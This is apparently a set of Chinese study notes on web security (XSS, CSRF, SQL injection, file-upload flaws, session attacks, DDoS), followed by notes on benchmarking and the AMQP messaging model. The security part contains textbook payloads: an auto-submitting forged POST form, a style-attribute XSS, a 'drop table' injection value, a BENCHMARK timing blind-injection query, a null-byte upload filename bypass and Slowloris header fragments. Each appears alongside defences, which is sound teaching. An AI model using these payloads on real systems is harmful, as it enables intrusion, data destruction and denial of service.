同样的，可以通过img的src标签来发起GET请求。对于POST请求，则可以通过JavaScript动态构造一个表单，然后自动提交这个表单来实现：
```
var f = document.createElement("form");
f.action = "...";
f.method = "post";
document.body.appendChild(f);

var il = document.createElement("input");
il.name = "ck";
il.value = "dd";
f.append(il);

f.submit();
```

详略（很多历史问题原理的讨论，现已修复）。

通过style标签也能构造出XSS：
```
<div style="background: url('javascript:alert(1)')">
```

**XSS Worm**
一般来说，用户之间发生交互行为的页面（发送站内信、用户留言等），如果存在存储型XSS，则比较容易发起XSS Worm攻击。
详略。

**XSS构造技巧**
利用字符编码，绕过长度限制，利用<base>标签，利用window.name等，详略。

**XSS的防御**
* 1.将Cookies设为HttpOnly，浏览器将禁止页面的JavaScript访问带有HttpOnly的Cookie。（严格来说HttpOnly并非为了对抗XSS，它解决的是XSS后的Cookies劫持攻击）。
服务器可能会设置多个Cookie，而HttpOnly可以有选择性地加在任何一个Cookie上：
```
<?php
header("Set-Cookie:cookie1=test1;");
header("Set-Cookie:cookie2=test2;httponly",false);
?>
```
当通过document.cookie读取cookie时，只有cookie1能被JavaScript读取到。

* 2.输入检查：即对输入格式进行检查，检查工作必须放在服务器端代码中实现；
* 3.输出检查：在变量输出到HTML页面时使用编码或转义的方式（HtmlEncode）来防御XSS攻击；


## 跨站点请求伪造（CSRF）
Cross Site Request Forgery。
**浏览器Cookie策略**
Cookie有两种：
* 1.Session Cookie，又称临时Cookie，浏览器关闭后即消失；保存在浏览器进程空间中，所以在浏览器中新打开tab时仍然有效。
* 2.Third-party Cookie，又称本地Cookie，在设置时指定过期时间；保存在本地。

当浏览器从一个域的页面中加载另一个域的资源时，出于安全考虑，某些浏览器会阻止Third-party Cookie的发送。比如在b域中通过iframe引用a域的页面，这种情况下不会带上a域的cookie。然而FireFox默认不阻止Third-party Cookie的发送，所以更容易发生CSRF攻击。

**CSRF的防御**
* 1.验证码；
* 2.Referer Check：检查请求是否来自合法的源。缺陷在于服务器并非什么时候都能取到Referer（比如用户的浏览器隐私设置、从HTTPS跳转HTTP等）。
* 3.Anti CSRF Token
同时在表单和Session（或cookie）中设置一个token，在提交请求时服务器验证表单中的token和用户Session（或cookie）中的token是否一致，如果一致则为合法请求，否则可能发生了CSRF攻击。
token应该不可预测，且当表单提交后，token应该失效。

**XSRF**
Anti CSRF Token仅仅用于对抗CSRF攻击，当网站还同时存在XSS漏洞时，这个方案就会无效，因为XSS可以模拟客户端浏览器执行任意操作，包括请求页面后读出页面里的token，然后再构造出一个合法的请求，这个过程称为XSRF。


## 注入攻击
注入攻击的本质是把用户的数据当做代码执行。这里有两个关键条件：
* 1.用户能够控制输入；
* 2.原本程序要执行的代码拼接了用户输入的数据；

**SQL注入**
例如：
```
var sql = "select * from OrderTable where ShipCity = '" + ShipCity + "'";
```
变量ShipCity由用户提交，而用户提交如下的值：
```
Beijing';drop table OrderTable;
```
如果Web服务器开启了错误回显，则会加大SQL注入的风险。

**盲注（Blind Injection）**
盲注即在服务器没有错误回显时使用盲注验证的方法完成注入攻击。
即根据页面参数构造不同的查询条件来猜测，详略。

**Timing Attack**
盲注的一种，利用MySQL的BENCHMARK()函数可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断出注入语句是否执行成功。
比如当页面基于id查询时，可以构造如下的id：
```
1170 UNION SELECT IP(SUBSTRING(current,1,1))=CHAR(119),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM (Select Database() as current) as tb1;
```
以上代码判断库名的第一个字母是否为'w'，如果为真，则BENCKMARK()函数将造成较长时间的延迟，否则会很快执行完。

**正确地防御SQL注入**
* 1. 使用预编译语句绑定变量（最佳方式）；
* 2. 使用安全的存储过程；
* 3. 检查数据类型；
* 4. 使用安全函数；

**其他注入攻击**
* 1. XML注入，详略。
* 2. 代码注入，详略。
* 3. CRLF注入：凡是使用CRLF作为分隔符的地方都可能存在注入问题，比如log注入、HTTP头注入（截断HTTP头中，比如Set-Cookie，插入JavaScript代码）；假如服务器没有过滤‘\r\n’，而又把用户输入的数据放在HTTP头中，则可能导致这种安全隐患。


## 文件上传漏洞
文件上传漏洞指Web用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行Web服务器端命令的能力（即所谓的webshell）。要完成这个攻击需要满足以下条件：
* 1. 上传的文件能够被Web容器解释执行；
* 2. 用户能够从Web上访问这个文件；
* 3. 用户上传的文件不能被安全检查、格式化、图片压缩等功能改变了内容；
在针对上传文件的检查中，很多应用都是通过判断文件名后缀的方法来验证。有时可以通过修改上传过程的POST包，在文件名后添加一个%00字节，则可以截断某些函数对文件名的判断，因为在很多语言中（C、PHP）0x00被认为是终止符。比如原本只允许上传jpg文件，那么可以构造文件名为xxx.php[\0].jpg,因为[\0]为16进制的0x00字符，.jpg绕过了应用的上传文件类型的判断，但是对于服务器来说，此文件因为0x00字符截断的关系，最终变成xxx.php。
有些应用通过判断上传文件的文件头信息来验证文件的类型，为了绕过应用中类似MIME Sniff的功能，常见的攻击技巧是伪造一个合法的文件头，而将真实的PHP等脚本代码附在合法的文件头之后。当然，这种情况下需要让Web Server将此文件当做PHP文件来解析才能实现攻击。
Apache、IIS等，旧版本中都有一些已知的文件路径解析的漏洞，详略。


## 利用上传文件钓鱼及设计安全的文件上传功能
通过伪造文件头的方式（比如伪造一个png文件），构造一个实际内容为JavaScript的图片，JavaScript中的代码重定向到钓鱼网站。这样，在传播钓鱼网站时可以传播合法的图片URL（域名合法），在低版本的浏览器中会将此文件当做HTML执行，从而将用户诱导到钓鱼网站。（现代浏览器不会将jpg当做HTML执行）

**设计安全的文件上传功能**
* 1. 文件上传的目录设置为不可执行；
* 2. 判断文件类型，对于图片处理可以使用压缩函数、resize函数等以破坏图片中可能存在的代码；
* 3. 使用随机数改写文件名和文件路径；
* 4. 单独设置文件服务器的域名；

## 认证与授权的区别
认证的目的是为了认出用户是谁，而授权的目的是为了解决用户能够做什么。

## Session Fixation攻击
在用户登录网站的过程中，如果登录前后用户的SessionID没有发生变化，则会存在Session Fixation问题。所以，在每次登录成功后应该重写SessionID。

## Session保持攻击
攻击者可以通过不停地发起访问请求让Session一直存活。
如果Session完全存储在Cookie中，可以通过篡改Cookie的Expire时间来使其保持有效。


## 访问控制系统设计策略
访问控制实际上就是建立用户与权限之间的对应关系。
在Web应用中，根据访问客体的不同，常见的访问控制可以分为基于URL的访问控制、基于方法的访问控制、基于数据的访问控制等。

* 垂直权限管理
基于角色的访问控制（RBAC）。事先在系统中定义出不同的角色，不同的角色拥有不同的权限，一个角色实际上就是一个权限的集合，而系统的所有用户会被分配到不同的角色中，一个用户也可能有多个角色。在系统验证权限时，只需要验证用户所属的角色，然后就可以根据该角色所拥有的权限进行授权了。（权限即是否能够访问某个资源，而资源可以是URL路径、路由、method等）

* 水平权限管理
在RBAC模型下，系统只会验证用户A是否属于角色RoleX，而不会判断用户A是否能访问只属于B的数据，因此会发生越权访问。系统只验证了能访问数据的角色，没有对角色内的用户做细分，也没有对数据的子集做细分，缺乏一个用户到数据之间的对应关系。
水平权限管理问题是个难题，因为对于数据的访问控制与业务结合得十分紧密，至今仍未在统一框架下解决。


## 常见DDOS攻击方式
Distributed Denial of Service,分布式拒绝服务，利用合理的请求造成资源过载，导致服务不可用。
* SYN flood
SYN flood是一种最为经典的DDOS攻击，它利用了TCP协议设计的缺陷，先伪造大量的源IP地址向服务器端发送大量的SYN包，服务器端接收后会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端收不到伪造的IP的回应，于是重试3~5次并等待一个SYN Time(30~120s)，超时后丢弃连接。攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源来处理这种半连接，进而导致拒绝服务。
主要的对抗方式是SYN Cookie，为每一个IP地址分配一个Cookie，并统计每个IP地址的访问频率，如果在短时间内收到大量来自同一个IP地址的数据包，则认为受到了攻击，之后来自这个IP地址的包将被丢弃。

* 应用层DDOS
发生在应用层（TCP连接已建立），比如对一些资源消耗较大的应用页面不断地发起正常的请求，以达到消耗服务器端资源的目的。是针对服务器性能的一种攻击。

最常见的防御措施是在应用中针对每个客户端（IP+Cookie）做一个请求频率的限制。

* Slowloris攻击
比如以极低的速度往服务器发送HTTP请求，由于Web Server对于并发的连接数都有一定的上限，因此当恶意占用这些连接不释放时，WebServer的所有连接将被占用，从而无法接受新的请求。
比如构造一个畸形的HTTP请求：
```
GET / HTTP/1.1\r\n
....
Content-Lenght:42\r\n
```
在正常的HTTP包头中是以两个CLRF表示HTTP Headers部分结束的：
```
Content-Length:42\r\n\r\n
```
由于Web Server只收到一个\r\n，因此将认为HTTP Headers部分没有结束，并保持此连接不释放，继续等待完整的请求，此时客户端再发送任意HTTP头，保持住连接即可：
```
X-a:b\r\n
```
这种攻击几乎对所有Web Server都有效。

* HTTP POST DOS
在发送HTTP POST包时指定一个非常大的Content-Length值，然后以很低的速度发包（比如10~100s发一个字节），保持这个连接不断开，这样当客户端连接数多了以后占用住Web Server的所有可用连接，从而导致DOS。

* Server Limit DOS
Web Server对HTTP包头都有长度限制，比如Apache默认为8192字节，如果客户端发送的HTTP包头超过这个大小，服务器会返回一个4xx错误。攻击者通过XSS攻击恶意地往客户端写入一个超长的Cookie，则该客户端在清空Cookie之前将无法再访问该Cookie所在域的任何页面。

* ReDOS
正则表达式也能造成拒绝服务：构造恶意的输入，消耗大量的系统资源（比如CPU和内存），从而导致整台服务器的性能下降。
详略。

## DDOS防御
* 1. 验证码：CAPTCHA,Complete Automated Public Turing Test to Tell Computers and Humans Apart,全自动区分计算机和人类的图灵测试。
* 2. 让客户端解析一段JavaScript，并给出正确的运行结果；
* 3. 优化Web Server的配置，比如调小Timeout、KeepAliveTimeout的值、增加MaxClients的值等。

## 基准测试有性能剖析概念理解
基准测试是针对系统设计的一种压力测试，通常的目标是为了掌握系统的行为。通常的测试指标包括：吞吐量、响应时间（延迟）、并发性、可扩展性。
性能剖析（profiling）：测量服务器的时间花费在哪里。

性能剖析的代码会导致服务器变慢，可以采用随机采样：
```
<?php
$profiling_enabled = rand(0,100) > 99;
...
```


## AMQP的工作模型
**AMQP**:Advanced Message Queuing Protocol，是一个用于特定客户端与特定**消息代理**通信的协议。因为**AMQP的“实体”（即Exchange、message、queue等）和路由架构是由应用程序自己定义的**（而不是代理管理员），所以AMQP是一个支持编程扩展的协议。

```
publisher --publish--> exchange --routes--> queue --consumers--> consumer
```

## AMQP的Exchanges及其类型
* Default Exchange
由消息代理（broker）预先定义的，未命名的exchange。每一个被创建的queue都使用queue的名称自动绑定到该exchange。比如定义一个名为“search-indexing-online”的queue，那么AMQP broker将会使用“search-indexing-online”为routing key将该队列绑定到默认的exchange，当一个带有该routing key的消息被发布时，将会被路由到"search-indexing-online"这个队列。

* Direct Exchange
直接Exchange基于消息的路由键（message routing key）来分发消息。当一个带有routing key的消息到来时，Direct Exchange将会把该消息分发给所有使用该key进行绑定的queue（注意，这里的queue也可能是多个，即它们要处理的routing key相同）。

**当有多个队列匹配时，时轮询还是全部发送？** 全部发送

* Fanout Exchange
Fanout Exchange会把收到的消息分发给所有绑定的queue（即忽略routing key），适用于广播的场景。

* Topic Exchange
基于消息的routing key和匹配模式（pattern）来分发消息。

* Headers Exchange
忽略routing key，而是基于message headers来分发消息。

当其x-match参数设为any时，只要有一个header值满足条件，则消息会被分发。当设为all时，所有headers都必须满足才会被分发。


## AMQP Queue的主要属性
queue用来保存消息，主要有以下这些属性：
* Name
* Durable：broker重启后消息不会丢失
* Exclusive：该queue只能用于一个连接，且当连接关闭时queue将会被删除
* Auto-delete：当最后一个消费者解除订阅时，queue将被删除
* Arguments：一些broker使用它来实现重要的属性，比如message的TTL


## AMQP的Binding绑定的是哪两者之间的关系？
Binding用来指定exchanges与queue之间的路由关系。
如果一个消息无法被路由（比如消息发布到的exchange没有绑定任何queue），那么这个消息将会被丢弃或者返回给消息的发布者（取决于消息发布者的设置）。

## AMQP Message的主要属性
* Content type
* Content encoding
* Routing key
* Delivery mode (persistent or not)
* Message priority
* Message publishing timestamp
* Expiration period
* Publisher application id
AMQP messages支持携带负载信息（payload），**AMQP brokers会把这些信息当做字节数组**进行透明传输，而不会去修改它们。
在发布消息时可以指定消息为持久消息，如果这样，队列将会持久化这些消息（影响性能）。

# AMQP Methods
AMQP定义了一系列的方法（类似HTTP的方法，而不是程序语言的方法），方法使用类（classes）来组织。
**exchange class**
一组与exchange操作相关的方法:
* exchange.declare
* exchange.declare-ok
* exchange.delete
* exchange.delete-ok

比如一个客户端请求broker来定义一个新的exchange：
```
Client(Publisher/Consumer) --exchange.declare--> AMQP broker
              [name="xxx",type="direct",durable=true,...]
```
如果创建成功，broker将会通过exchange.declare-ok方法返回信息：
```
Client(Publisher/Consumer) <--exchange.declare-ok-- AMQP broker
```

并非所有的AMQP方法都有对应的response方法，比如basic.publish。


## AMQP Channels
有些应用程序可能同时需要多个连接连接到AMQP broker，但是同时保持多个打开的TCP连接是不可取的。
AMQP 0-9-1连接使用channel来实现并发连接的功能。多个channel共享同一个TCP连接。常用的场景是在每一个进程或线程中打开一个channel，不同channel之间的数据是不共享的（因而所有的AMQP方法都同时带有一个channel number以便于客户端判断操作对应的channel）。

## AMQP Virtual Hosts
AMQP提供类似Web Server的vhosts的概念，用于提供独立的broker运行环境。AMQP客户端在连接阶段可以指定想要连接的vhost。

































